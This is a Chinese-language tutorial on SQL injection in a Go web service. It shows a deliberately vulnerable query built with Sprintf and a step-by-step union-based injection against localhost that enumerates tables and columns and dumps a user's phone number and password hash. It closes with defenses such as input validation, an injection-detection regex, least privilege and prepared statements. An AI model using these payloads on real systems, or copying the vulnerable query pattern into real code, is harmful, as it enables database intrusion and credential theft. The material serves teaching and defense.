# 参数相关的安全漏洞：SQL注入

在开发中，某些表的数据库自增id基于安全保密的要求通常会对其加密， 比如YouTube的视频详情页url：https://www.youtube.com/watch?v=iryTrPab4l8 ；<br>
iryTrPab4l8字符串就是通过一定规则加密而来，通常可以解密还原对应的id数字，
我们通过这个实际的业务场景来演示sql注入步骤。
```go
// controller.Article
func (ctr *Article) One(c *gin.Context) (response.Data, error) {
    hashID := c.DefaultQuery("hashID", "")
    article := ctr.repo.Get(c.Request.Context(), hashID)
    
    return article, nil
}

// repository.Article
func (repo *Article) Get(ctx context.Context, hashID string) *entity.Article {
    query := fmt.Sprintf("select hash_id, title, content from articles where hash_id='%s'", hashID)
    row := repo.db.QueryRowContext(ctx, query)
	
    var article entity.Article
    article.HashIDQuery = hashID
    article.SQL = query
    if row.Err() != nil {
        article.Err = row.Err().Error()
    }
    row.Scan(&article.HashID, &article.Title, &article.Content)
    return &article
}
```
[源码链接](../param-validate-sql-injection)

代码说明：<br>
1、实现了通过加密ID获取文章详情的功能；<br>
2、数据库连接账号：root；<br>
3、数据库存在两张表：articles（文章表）、users（用户表），表结构在test.sql文件里；<br>
4、为了演示方便，把hashID参数、sql语句、数据库错误信息对外展示；<br>

正常传参请求：<br>
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8 

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "iryTrPab4l8",
    "Title": "文章标题",
    "Content": "内容",
    "HashIDQuery": "iryTrPab4l8",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8'",
    "Err": ""
  }
}
```

#### 第一步：确定注入点
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=1# 
请求这个地址，发现浏览器自动过滤了#号，没有对其自动编码，需要手动编码； 
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=1%23 

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "iryTrPab4l8",
    "Title": "文章标题",
    "Content": "内容",
    "HashIDQuery": "iryTrPab4l8' and 1=1#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=1#'",
    "Err": ""
  }
}
```
代码sql字符串中hash_id='%s'有两个单引号，参数中的单引号是为了和第一个单引号配对，#号是为了注释第二号单引号，从而形成一条语法正常的sql语句。此时接口返回正常，确定此处存在注入点。

#### 第二步：确定select语句中的字段数量
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=1 order by 10%23
        
{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "",
    "Title": "",
    "Content": "",
    "HashIDQuery": "iryTrPab4l8' and 1=1 order by 10#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=1 order by 10#'",
    "Err": "Error 1054 (42S22): Unknown column '10' in 'order clause'"
  }
}
```
order by number含义是按照select语句中的第几个字段排序，比如order by 1就是按照hash_id排序，order by 2就是按照title排序，
当超过select语句中字段数量时，sql就会报错，可以通过递减的方式，从10递减到3，接口返回正常，确定sql的字段数量为3；
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=1 order by 3%23
        
{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "iryTrPab4l8",
    "Title": "文章标题",
    "Content": "内容",
    "HashIDQuery": "iryTrPab4l8' and 1=1 order by 3#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=1 order by 3#'",
    "Err": ""
  }
}
```
#### 第三步：暴占位符
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,3%23
        
{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "3",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,3#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,3#'",
    "Err": ""
  }
}
```
and 1=2导致前一个select结果为空，再使用union暴露第二个select结果；

#### 第四步：暴库
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,database()%23

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "test",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,database()#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,database()#'",
    "Err": ""
  }
}
```
通过database()函数确定数据库名为：test；

#### 第四步：暴表名
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 0,1%23
        
{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "articles",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 0,1#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 0,1#'",
    "Err": ""
  }
}
```
1、查询系统表需要root权限
2、通过系统表information_schema.tables和数据库名test，暴露了第一张表articles；<br>
3、递增limit，可以暴露出所有表名；<br>
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 1,2%23
        
{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "users",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 1,2#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='test' limit 1,2#'",
    "Err": ""
  }
}
```
拿到了用户表名：users；
#### 第五步：暴字段名

```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 0,1%23

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "id",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 0,1#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 0,1#'",
    "Err": ""
  }
}
```
1、通过系统表information_schema.columns和数据库名test和表名users，暴露了第一个字段名id；<br>
2、递增limit，可以暴露出所有字段名；<br>
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 1,2%23

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "mobile",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 1,2#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 1,2#'",
    "Err": ""
  }
}

http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 2,3%23

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "2",
    "Content": "password",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 2,3#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema='test' and table_name ='users' limit 2,3#'",
    "Err": ""
  }
}
```
拿到了用户表手机号密码字段名：mobile、password；
#### 第六步：暴数据
```
http://127.0.0.1:8080/article?hashID=iryTrPab4l8' and 1=2 union select 1,mobile,password from users limit 0,1%23

{
  "code": 0,
  "message": "OK",
  "data": {
    "HashID": "1",
    "Title": "13000000000",
    "Content": "a906449d5769fa7361d7ecc6aa3f6d28",
    "HashIDQuery": "iryTrPab4l8' and 1=2 union select 1,mobile,password from users limit 0,1#",
    "SQL": "select hash_id, title, content from articles where hash_id='iryTrPab4l8' and 1=2 union select 1,mobile,password from users limit 0,1#'",
    "Err": ""
  }
}
```
1、通过表名users和字段名，暴露了第一个用户的手机号和密码；<br>
2、递增limit，可以暴露出所有手机号和密码；<br>

打开网址：https://www.cmd5.com/ ；输入密码字符串，解密密码字符串为：123abc


#### 总结
**1、用户的输入都是非法的数据，需要进行验证、过滤、转义。**
```go
type HashIDField struct {
    HashID string `binding:"required,alphanum"`
}
// 参数hashID组成结构限制为字母和数字，有效的避免了用户输入单引号、井号、百分号、空格等非法字符，参数长度限制联表的可能性
```

某些场景下，比如搜索功能，就不好限制字母和数字，可以通过检查参数是否含有sql注入需要的关键词进行验证。
```go
type KeywordField struct {
    Keyword string `binding:"required,sqlinject"`
}

func sqlInject(s string) bool {
    detectSqlInjectRegex := `(?:')|(?:--)|(/\\*(?:.|[\\n\\r])*?\\*/)|(\b(select|update|and|or|delete|insert|trancate|char|chr|into|substr|ascii|declare|exec|count|master|into|drop|execute)\b)`
    return regexp.MustCompile(detectSqlInjectRegex).MatchString(s)
}
```

**2、应用禁止使用管理员账号连接数据库，增删改查即可。**<br>
root权限可以查询information_schema系统表，小公司或者外包公司做的项目，因为方便省事使用root账号连接数据库比比皆是，希望引以为戒。

存在注入点的情况下，即使使用了普通权限账号还是有风险，可以通过猜表名、猜字段名的的方式暴露数据；<br>
常用用户表名：users、user、admin、admin_user等等，<br>
常用手机号字段名：mobile、phone、phone_number等等，<br>
增加表前缀可以有效提高猜表难度，例如tsy_users，很多开源cms都要配置一个统一的表前缀就是基于这个目的。

**3、密码加salt，salt长度要足够长，增加解密难度。**<br>
现实开发中也遇到过几次密码明文或者无salt加密存储，永远不要低估人的惰性心理。

**4、防sql注入利器，mysql预编译机制**
```go
// 即时sql
query := fmt.Sprintf("select hash_id, title, content from articles where hash_id='%s'", hashID)
row := repo.db.QueryRowContext(ctx, query)

// 预处理sql
query := "select hash_id, title, content from articles where hash_id=?"
row := repo.db.QueryRowContext(ctx, query, hashID)
// 把上面两行代码改成下面两行代码就能很有效的预防sql注入
```
什么是mysql预处理？<br>
**即时sql**<br>
一条sql在DB接收到最终执行完毕返回，大致的过程如下：
```
1. 词法和语义解析；
2. 优化sql语句，制定执行计划，比如使用哪个索引进行查询等等；
3. 执行并返回结果；
```
即时sql每次sql语句不同导致第1、2步一直执行，属于一次编译，单次运行，效率不高。

**预编译sql**<br>
绝大多数情况下，sql语句每次执行的时候只有个别的值不同（比如select的where子句值不同，update的set子句值不同，insert的values值不同）。
如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就低下。<br>
预编译语句就是将此类sql语句中的值用占位符替代，可以视为将sql语句模板化；<br>
预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程。

**预编译语句能防sql注入原理：**<br>
在预编译的机制下，用户在向原有SQL语句传入值之前，执行计划已经编译完成，该查哪张表已固定，因此无论用户输入什么样的内容，都改不了执行计划。
至此，任何输入的内容都只会被当做值来看待，不会再出现非预期的查询，这便是预编译能够防御SQL注入的根本原因。

>预编译防御sql注入，近乎完美但还是不能达到100%，有兴趣的小伙伴可以自己再深入调研一下。

有些程序员存在侥幸心理，认为自己开发的网站只是小网站不出名，数据少并且没有多大价值，没有黑客愿意花时间花精力入侵。<br>
1、小网站不出名黑客找不到<br>
google hack是黑客寻找sql注入漏洞的主要方式，比如在google搜关键字"inurl:php?id="，所有包含"php?id="的url都能展示出来，
然后入侵工具可以自动翻页，自动检测是否存在注入点；<br>
所以网站再小能保证不会搜索引擎收录吗？

2、数据少并且没有多大价值<br>
小网站的数据黑客是没有兴趣，要的是服务器，可以把服务器当肉鸡做ddos攻击或者挖矿，上述的注入步骤只是sql注入漏洞的一部分，有些语言例如php还可以上传一句话小木马，小木马拉大木马，大木马提权，
可以直接获取到服务器root权限。

3、没有黑客愿意花时间花精力入侵<br>
黑客使用的工具都是高度自动化，存在漏洞的网站，黑客借助工具入侵网站的成本可能就是点个鼠标按个按钮的成本。





